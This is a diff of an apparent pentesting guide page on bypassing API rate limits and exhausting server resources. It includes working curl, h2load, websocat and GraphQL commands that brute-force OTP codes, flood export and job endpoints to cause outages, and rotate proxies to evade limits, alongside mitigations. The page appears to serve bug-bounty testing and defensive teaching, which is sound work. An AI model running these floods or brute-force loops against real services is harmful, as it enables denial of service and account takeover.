@@ -1469,30 +1430,28 @@ X-Forwarded-For: 127.0.0.1
 <p><strong>Splitting Across Accounts/Sessions</strong></p>
 <p>Use multiple accounts/tokens if per-account limited.</p>
 <p>Example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST https://api.example.com/data <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer token1&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{&#34;query&#34;:&#34;example request&#34;}&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST https://api.example.com/data <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer token1&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -d <span style="color:#e6db74">&#39;{&#34;query&#34;:&#34;example request&#34;}&#39;</span>
 </span></span><span style="display:flex;"><span>-----------------------------------------------------------------------------------
 </span></span><span style="display:flex;"><span>curl -X POST https://api.example.com/data <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer token2&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{&#34;query&#34;:&#34;example request&#34;}&#39;</span>
-</span></span></code></pre></div></li>
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer token2&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -d <span style="color:#e6db74">&#39;{&#34;query&#34;:&#34;example request&#34;}&#39;</span></span></span></code></pre></div></li>
 <li>
 <p><strong>Response Oracle Check (separate from rate-limit bypass)</strong></p>
 <p>This isn&rsquo;t actually a rate-limit bypass - it&rsquo;s a check for a <em>different</em> bug that&rsquo;s worth testing alongside rate limiting: does the response (status code, timing, body length) differ between a valid and invalid code, even while rate limiting is enforced correctly? If so, an attacker doesn&rsquo;t need to bypass the rate limit at all - the oracle itself may let them narrow down the valid code faster than brute force would otherwise require, or confirm account/OTP validity without ever exceeding the limit.</p>
 <p>Example:</p>
 <pre tabindex="0"><code>Attempt 1 → OTP: 123456 → Response: 401 Unauthorized (87ms)
 Attempt 2 → OTP: 654321 → Response: 401 Unauthorized (85ms)
-Attempt 3 → OTP: 789012 (valid) → Response: 200 OK (140ms)
-</code></pre><p>Flag this separately in your report from any rate-limiting finding - it&rsquo;s a distinct root cause (information disclosure via response variance) even though you noticed it during the same testing session.</p>
+Attempt 3 → OTP: 789012 (valid) → Response: 200 OK (140ms)</code></pre><p>Flag this separately in your report from any rate-limiting finding - it&rsquo;s a distinct root cause (information disclosure via response variance) even though you noticed it during the same testing session.</p>
 </li>
 <li>
 <p><strong>HTTP/2 Multiplexing &amp; Pipelining</strong></p>
 <p>Send multiple parallel requests (streams) over a single TCP/TLS connection to bypass weak rate limits.</p>
 <p>Note: plain <code>curl</code> cannot multiplex many streams over one HTTP/2 connection - each <code>curl</code> invocation opens its own connection regardless of <code>-P</code> value in xargs, so this only demonstrates concurrent <em>connections</em>, not single-connection multiplexing. To actually test true HTTP/2 multiplexing (many streams, one connection), use a tool built for it:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># h2load - sends N requests over a fixed number of connections/streams, purpose-built for HTTP/2 load testing</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># h2load - sends N requests over a fixed number of connections/streams, purpose-built for HTTP/2 load testing</span>
 </span></span><span style="display:flex;"><span>h2load -n <span style="color:#ae81ff">100</span> -c <span style="color:#ae81ff">1</span> -m <span style="color:#ae81ff">100</span> https://target/api/v2/verify
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># -n 100  = 100 total requests</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># -c 1    = 1 TCP connection</span>
@@ -1501,40 +1460,36 @@ Attempt 3 → OTP: 789012 (valid) → Response: 200 OK (140ms)
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># If h2load isn&#39;t available, this curl-based approach at least demonstrates</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># concurrent-request flooding (multiple connections, not true multiplexing):</span>
 </span></span><span style="display:flex;"><span>seq <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">100</span> | xargs -I@ -P100 curl -k --http2-prior-knowledge -X POST <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{&#34;code&#34;:&#34;@&#34;}&#39;</span> https://target/api/v2/verify &amp;&gt;/dev/null
-</span></span></code></pre></div></li>
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -d <span style="color:#e6db74">&#39;{&#34;code&#34;:&#34;@&#34;}&#39;</span> https://target/api/v2/verify &amp;&gt;/dev/null</span></span></code></pre></div></li>
 <li>
 <p><strong>GraphQL aliases &amp; batched operations</strong></p>
 <p>GraphQL allows the client to send several logically independent queries or mutations in a single request by prefixing them with aliases. Because the server executes every alias but the rate-limiter often counts only one request, this is a reliable bypass for login or password-reset throttling.</p>
 <p>Example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-graphql" data-lang="graphql"><span style="display:flex;"><span><span style="color:#66d9ef">mutation</span> <span style="color:#a6e22e">bruteForceOTP</span> {
-</span></span><span style="display:flex;"><span>  a: <span style="color:#a6e22e">verify</span>(code:<span style="color:#e6db74">&#34;111111&#34;</span>) { <span style="color:#a6e22e">token</span> }
-</span></span><span style="display:flex;"><span>  b: <span style="color:#a6e22e">verify</span>(code:<span style="color:#e6db74">&#34;222222&#34;</span>) { <span style="color:#a6e22e">token</span> }
-</span></span><span style="display:flex;"><span>  c: <span style="color:#a6e22e">verify</span>(code:<span style="color:#e6db74">&#34;333333&#34;</span>) { <span style="color:#a6e22e">token</span> }
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-graphql" data-lang="graphql"><span style="display:flex;"><span><span style="color:#66d9ef">mutation</span> <span style="color:#a6e22e">bruteForceOTP</span> {
+</span></span><span style="display:flex;"><span>  a: <span style="color:#a6e22e">verify</span>(code:<span style="color:#e6db74">&#34;111111&#34;</span>) { token }
+</span></span><span style="display:flex;"><span>  b: <span style="color:#a6e22e">verify</span>(code:<span style="color:#e6db74">&#34;222222&#34;</span>) { token }
+</span></span><span style="display:flex;"><span>  c: <span style="color:#a6e22e">verify</span>(code:<span style="color:#e6db74">&#34;333333&#34;</span>) { token }
 </span></span><span style="display:flex;"><span>  <span style="color:#75715e"># … add up to dozens of aliases …</span>
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div></li>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div></li>
 <li>
 <p><strong>Batch/Bulk REST Endpoints</strong></p>
 <p>Some APIs expose helper endpoints such as <code>/v2/batch</code> or accept an <strong>array of objects</strong> in the request body. If the limiter is placed in front of the <em>legacy</em> endpoints only, wrapping multiple operations inside a single bulk request may completely sidestep the protection.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
 </span></span><span style="display:flex;"><span>  {<span style="color:#f92672">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;/login&#34;</span>, <span style="color:#f92672">&#34;method&#34;</span>: <span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#f92672">&#34;body&#34;</span>: {<span style="color:#f92672">&#34;user&#34;</span>:<span style="color:#e6db74">&#34;bob&#34;</span>,<span style="color:#f92672">&#34;pass&#34;</span>:<span style="color:#e6db74">&#34;123&#34;</span>}},
 </span></span><span style="display:flex;"><span>  {<span style="color:#f92672">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;/login&#34;</span>, <span style="color:#f92672">&#34;method&#34;</span>: <span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#f92672">&#34;body&#34;</span>: {<span style="color:#f92672">&#34;user&#34;</span>:<span style="color:#e6db74">&#34;bob&#34;</span>,<span style="color:#f92672">&#34;pass&#34;</span>:<span style="color:#e6db74">&#34;456&#34;</span>}}
-</span></span><span style="display:flex;"><span>]
-</span></span></code></pre></div></li>
+</span></span><span style="display:flex;"><span>]</span></span></code></pre></div></li>
 <li>
 <p><strong>Timing Sliding-Window</strong></p>
 <p>A classic token-bucket or leaky-bucket limiter <em>resets</em> on a fixed time boundary (for example, every minute). If the window is known (e.g. via error messages such as <code>X-RateLimit-Reset: 27</code>), fire the maximum allowed number of requests <strong>just before</strong> the bucket resets, then immediately fire another full burst.</p>
 <p>Example:</p>
 <pre tabindex="0"><code>|&lt;-- 60 s window ‑-&gt;|&lt;-- 60 s window ‑-&gt;|
-       ######                 ######
-</code></pre></li>
+       ######                 ######</code></pre></li>
 <li>
 <p><strong>Upgrading to WebSockets / gRPC streaming after the handshake</strong></p>
 <p>Many edge rate-limiters only inspect the <strong>initial HTTP request</strong>. Once the connection is upgraded to WebSocket (HTTP 101) or gRPC bidirectional streaming, subsequent messages often bypass request-per-second counters because they are no longer separate HTTP requests.</p>
 <p>Example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Flood 1,000 OTP guesses through a single WebSocket connection</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Flood 1,000 OTP guesses through a single WebSocket connection</span>
 </span></span><span style="display:flex;"><span>seq -w <span style="color:#ae81ff">000000</span> <span style="color:#ae81ff">000999</span> | websocat -n ws://target.tld/api/verify-ws
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># gRPC streaming: send multiple Verify requests in one stream</span>
@@ -1542,90 +1497,55 @@ Attempt 3 → OTP: 789012 (valid) → Response: 200 OK (140ms)
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{ &#34;code&#34;: &#34;111111&#34; }
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{ &#34;code&#34;: &#34;222222&#34; }
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{ &#34;code&#34;: &#34;333333&#34; }
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
-</span></span></code></pre></div></li>
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span></span></span></code></pre></div></li>
 <li>
 <p><strong>CDN PoP-Sharded Counters</strong></p>
 <p>Some CDNs shard rate-limit counters <strong>per data center/PoP instead of globally</strong>. Cloudflare explicitly states counters are not shared across data centers. By routing requests through egress nodes in many regions (residential proxy pools, anycast VPNs, or cloud VMs pinned to different continents), you multiply the allowed throughput: every PoP maintains an independent bucket for the same key.</p>
 <p>Quick and dirty layout using open proxies (example with <code>proxychains</code> + a country‑rotating list):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> p in <span style="color:#66d9ef">$(</span>cat proxies.txt<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> p in <span style="color:#66d9ef">$(</span>cat proxies.txt<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
 </span></span><span style="display:flex;"><span>  HTTPS_PROXY<span style="color:#f92672">=</span>$p curl -s -X POST https://target/api/login -d @payload.json &amp;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
-</span></span><span style="display:flex;"><span>wait
-</span></span></code></pre></div></li>
+</span></span><span style="display:flex;"><span>wait</span></span></code></pre></div></li>
 </ol>
 <hr>
-<h2 id="advanced-attack-scenarios">
-  Advanced Attack Scenarios
-  <a class="anchor" href="#advanced-attack-scenarios">#</a>
-</h2>
-<h3 id="1-chaining-resource-exhaustion-with-a-secondary-vulnerability">
-  1. Chaining Resource Exhaustion with a Secondary Vulnerability
-  <a class="anchor" href="#1-chaining-resource-exhaustion-with-a-secondary-vulnerability">#</a>
-</h3>
+<h2 id="advanced-attack-scenarios">Advanced Attack Scenarios<a class="anchor" href="#advanced-attack-scenarios">#</a></h2>
+<h3 id="1-chaining-resource-exhaustion-with-a-secondary-vulnerability">1. Chaining Resource Exhaustion with a Secondary Vulnerability<a class="anchor" href="#1-chaining-resource-exhaustion-with-a-secondary-vulnerability">#</a></h3>
 <p>Resource exhaustion becomes far more severe when the &ldquo;expensive&rdquo; endpoint also has a second flaw that amplifies the cost per request. For example, if a report-export endpoint accepts a date range and internally builds a query without proper indexing, a single crafted request can force a full table scan - combine that with concurrent request flooding and you turn what looks like a manageable load-testing finding into a full outage from a handful of requests, not thousands.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Instead of just flooding with a normal date range, target the specific input shape that makes the backend query maximally expensive</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Instead of just flooding with a normal date range, target the specific input shape that makes the backend query maximally expensive</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..20<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span>
 </span></span><span style="display:flex;"><span>  curl -X POST https://api.example.com/reports/export <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -d <span style="color:#e6db74">&#39;{&#34;type&#34;:&#34;csv&#34;,&#34;date_range&#34;:&#34;1900-01-01:2026-01-01&#34;,&#34;sort&#34;:&#34;random&#34;,&#34;include_all&#34;:true}&#39;</span> &amp;
+</span></span></span><span style="display:flex;"><span>    -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>    -d <span style="color:#e6db74">&#39;{&#34;type&#34;:&#34;csv&#34;,&#34;date_range&#34;:&#34;1900-01-01:2026-01-01&#34;,&#34;sort&#34;:&#34;random&#34;,&#34;include_all&#34;:true}&#39;</span> &amp;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
-</span></span><span style="display:flex;"><span>wait
-</span></span></code></pre></div><p>This is worth calling out specifically in a report: 20 requests causing an outage is a materially different severity story than needing 10,000 requests to achieve the same result, even though both technically fall under &ldquo;unrestricted resource consumption.&rdquo;</p>
-<h3 id="2-asynchronous-job-queue-exhaustion">
-  2. Asynchronous Job Queue Exhaustion
-  <a class="anchor" href="#2-asynchronous-job-queue-exhaustion">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>wait</span></span></code></pre></div><p>This is worth calling out specifically in a report: 20 requests causing an outage is a materially different severity story than needing 10,000 requests to achieve the same result, even though both technically fall under &ldquo;unrestricted resource consumption.&rdquo;</p>
+<h3 id="2-asynchronous-job-queue-exhaustion">2. Asynchronous Job Queue Exhaustion<a class="anchor" href="#2-asynchronous-job-queue-exhaustion">#</a></h3>
 <p>Many APIs offload expensive work (report generation, video processing, bulk emails) to a background job queue rather than processing it synchronously. This changes the attack surface: the initial HTTP request itself may look cheap and pass rate limiting easily, while the real cost lands on a worker pool minutes later, disconnected from the request that caused it.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Submit many &#34;cheap-looking&#34; requests that each queue an expensive background job</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Submit many &#34;cheap-looking&#34; requests that each queue an expensive background job</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..500<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span>
 </span></span><span style="display:flex;"><span>  curl -X POST https://api.example.com/jobs/generate-report <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;token&gt;&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -d <span style="color:#e6db74">&#39;{&#34;report_type&#34;:&#34;full_analytics&#34;,&#34;async&#34;:true}&#39;</span> &amp;
+</span></span></span><span style="display:flex;"><span>    -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;token&gt;&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>    -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>    -d <span style="color:#e6db74">&#39;{&#34;report_type&#34;:&#34;full_analytics&#34;,&#34;async&#34;:true}&#39;</span> &amp;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
-</span></span><span style="display:flex;"><span>wait
-</span></span></code></pre></div><p><strong>Why this matters for severity:</strong> rate limiting on the <em>submission</em> endpoint often doesn&rsquo;t map 1:1 to protection against <em>worker</em> exhaustion - check whether there&rsquo;s a separate queue depth limit or per-user job quota, since the HTTP-level rate limit alone frequently isn&rsquo;t enough here.</p>
-<h3 id="3-multipartbatch-amplification">
-  3. Multipart/Batch Amplification
-  <a class="anchor" href="#3-multipartbatch-amplification">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>wait</span></span></code></pre></div><p><strong>Why this matters for severity:</strong> rate limiting on the <em>submission</em> endpoint often doesn&rsquo;t map 1:1 to protection against <em>worker</em> exhaustion - check whether there&rsquo;s a separate queue depth limit or per-user job quota, since the HTTP-level rate limit alone frequently isn&rsquo;t enough here.</p>
+<h3 id="3-multipartbatch-amplification">3. Multipart/Batch Amplification<a class="anchor" href="#3-multipartbatch-amplification">#</a></h3>
 <p>Where an API accepts a batch or multipart request (see bypass technique #12), the &ldquo;cost&rdquo; of resource consumption isn&rsquo;t 1 unit per HTTP request - it can be N units per request, where N is however many operations you can pack into a single batch body before the server rejects it for being too large. Test how large a batch the server actually accepts before any batch-size limit kicks in; if there is no batch-size cap, a single request can carry the resource cost of thousands.</p>
 <hr>
-<h2 id="framework-specific-scenarios">
-  Framework-Specific Scenarios
-  <a class="anchor" href="#framework-specific-scenarios">#</a>
-</h2>
+<h2 id="framework-specific-scenarios">Framework-Specific Scenarios<a class="anchor" href="#framework-specific-scenarios">#</a></h2>
 <p>Resource consumption limits are frequently framework-level defaults that get left unconfigured, rather than something developers explicitly disable - meaning the vulnerability is often &ldquo;nobody changed the default&rdquo; rather than &ldquo;somebody made an active mistake.&rdquo; Worth checking framework-specific defaults directly:</p>
-<h3 id="nodejs--express">
-  Node.js / Express
-  <a class="anchor" href="#nodejs--express">#</a>
-</h3>
+<h3 id="nodejs--express">Node.js / Express<a class="anchor" href="#nodejs--express">#</a></h3>
 <p>Express itself has no built-in request body size limit - it depends entirely on whichever body-parsing middleware is used (<code>body-parser</code>, <code>express.json()</code>), and the default limit for <code>express.json()</code> is 100kb, which many teams raise significantly (or remove) for legitimate large-payload use cases without adding a replacement check elsewhere.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Test the actual configured limit directly</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Test the actual configured limit directly</span>
 </span></span><span style="display:flex;"><span>curl -X POST https://api.example.com/endpoint <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#34;{\&#34;data\&#34;:\&#34;</span><span style="color:#66d9ef">$(</span>python3 -c <span style="color:#e6db74">&#39;print(&#34;A&#34;*5000000)&#39;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">\&#34;}&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># A 413 Payload Too Large response confirms a limit is enforced; a 200/500 with a large response time is worth escalating</span>
-</span></span></code></pre></div><h3 id="python--django">
-  Python / Django
-  <a class="anchor" href="#python--django">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -d <span style="color:#e6db74">&#34;{\&#34;data\&#34;:\&#34;</span><span style="color:#66d9ef">$(</span>python3 -c <span style="color:#e6db74">&#39;print(&#34;A&#34;*5000000)&#39;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">\&#34;}&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># A 413 Payload Too Large response confirms a limit is enforced; a 200/500 with a large response time is worth escalating</span></span></span></code></pre></div><h3 id="python--django">Python / Django<a class="anchor" href="#python--django">#</a></h3>
 <p>Django&rsquo;s <code>DATA_UPLOAD_MAX_MEMORY_SIZE</code> (default 2.5MB) and <code>FILE_UPLOAD_MAX_MEMORY_SIZE</code> govern request body and file upload size respectively - check whether these have been raised or disabled (<code>None</code>) in a target&rsquo;s configuration by testing uploads incrementally past the 2.5MB default.</p>
-<h3 id="graphql-framework-agnostic">
-  GraphQL (framework-agnostic)
-  <a class="anchor" href="#graphql-framework-agnostic">#</a>
-</h3>
+<h3 id="graphql-framework-agnostic">GraphQL (framework-agnostic)<a class="anchor" href="#graphql-framework-agnostic">#</a></h3>
 <p>Unlike REST, a single GraphQL request can be made arbitrarily expensive through nesting or aliasing (see bypass technique #11) regardless of which backend framework serves it. The relevant defenses are query cost analysis and depth limiting - libraries like <code>graphql-cost-analysis</code>, <code>graphql-depth-limit</code>, or <code>graphql-query-complexity</code> - and their <em>absence</em> is the actual vulnerability, not a framework misconfiguration per se. Confirm whether a target&rsquo;s GraphQL endpoint enforces any of these by submitting a deeply nested or heavily aliased query (see the Exploitation section above) and checking whether it&rsquo;s rejected before execution or actually processed.</p>
 <hr>
-<h2 id="detection-techniques">
-  Detection Techniques
-  <a class="anchor" href="#detection-techniques">#</a>
-</h2>
-<h3 id="manual-detection-techniques">
-  Manual Detection Techniques
-  <a class="anchor" href="#manual-detection-techniques">#</a>
-</h3>
+<h2 id="detection-techniques">Detection Techniques<a class="anchor" href="#detection-techniques">#</a></h2>
+<h3 id="manual-detection-techniques">Manual Detection Techniques<a class="anchor" href="#manual-detection-techniques">#</a></h3>
 <ol>
 <li>
 <p><strong>High Request Frequency Testing</strong></p>
@@ -1669,20 +1589,14 @@ Attempt 3 → OTP: 789012 (valid) → Response: 200 OK (140ms)
 </ul>
 </li>
 </ol>
-<h3 id="automated-detection-techniques">
-  Automated Detection Techniques
-  <a class="anchor" href="#automated-detection-techniques">#</a>
-</h3>
+<h3 id="automated-detection-techniques">Automated Detection Techniques<a class="anchor" href="#automated-detection-techniques">#</a></h3>
 <p><strong>Burp Suite</strong></p>
 <ul>
 <li><strong>Intruder</strong>: Send a large number of identical requests to detect missing rate limiting and unrestricted processing.</li>
 <li><strong>Turbo Intruder</strong>: Perform high-concurrency request flooding to identify resource exhaustion conditions.</li>
 </ul>
 <hr>
-<h2 id="impacts">
-  Impacts
-  <a class="anchor" href="#impacts">#</a>
-</h2>
+<h2 id="impacts">Impacts<a class="anchor" href="#impacts">#</a></h2>
 <ul>
 <li>Denial of Service (DoS)</li>
 <li>Server resource exhaustion</li>
@@ -1697,10 +1611,7 @@ Attempt 3 → OTP: 789012 (valid) → Response: 200 OK (140ms)
 <li>Service outage</li>
 </ul>
 <hr>
-<h2 id="tools">
-  Tools
-  <a class="anchor" href="#tools">#</a>
-</h2>
+<h2 id="tools">Tools<a class="anchor" href="#tools">#</a></h2>
 <ul>
 <li>Burp Suite (Intruder, Turbo Intruder)</li>
 <li>ffuf, wfuzz</li>
@@ -1709,10 +1620,7 @@ Attempt 3 → OTP: 789012 (valid) → Response: 200 OK (140ms)
 <li>grpcurl (gRPC streaming tests)</li>
 </ul>
 <hr>
-<h2 id="mitigation--preventions">
-  Mitigation &amp; Preventions
-  <a class="anchor" href="#mitigation--preventions">#</a>
-</h2>
+<h2 id="mitigation--preventions">Mitigation &amp; Preventions<a class="anchor" href="#mitigation--preventions">#</a></h2>
 <ul>
 <li>Implement rate limiting per user/IP</li>
 <li>Enforce pagination limits</li>
@@ -1729,10 +1637,7 @@ Attempt 3 → OTP: 789012 (valid) → Response: 200 OK (140ms)
 <li>Apply rate limiting at the protocol level for WebSocket/gRPC streams, not just on the initial handshake</li>
 </ul>
 <hr>
-<h2 id="good-to-read">
-  Good To Read
-  <a class="anchor" href="#good-to-read">#</a>
-</h2>
+<h2 id="good-to-read">Good To Read<a class="anchor" href="#good-to-read">#</a></h2>
 <p><a href="https://hackerone.com/reports/640781" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/640781</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://hackerone.com/reports/812754" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/812754</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://hackerone.com/reports/670572" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/670572</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
@@ -1740,10 +1645,7 @@ Attempt 3 → OTP: 789012 (valid) → Response: 200 OK (140ms)
 <p><a href="https://hackerone.com/reports/1543718" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/1543718</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://hackerone.com/reports/481518" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/481518</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <hr>
-<h2 id="references">
-  References
-  <a class="anchor" href="#references">#</a>
-</h2>
+<h2 id="references">References<a class="anchor" href="#references">#</a></h2>
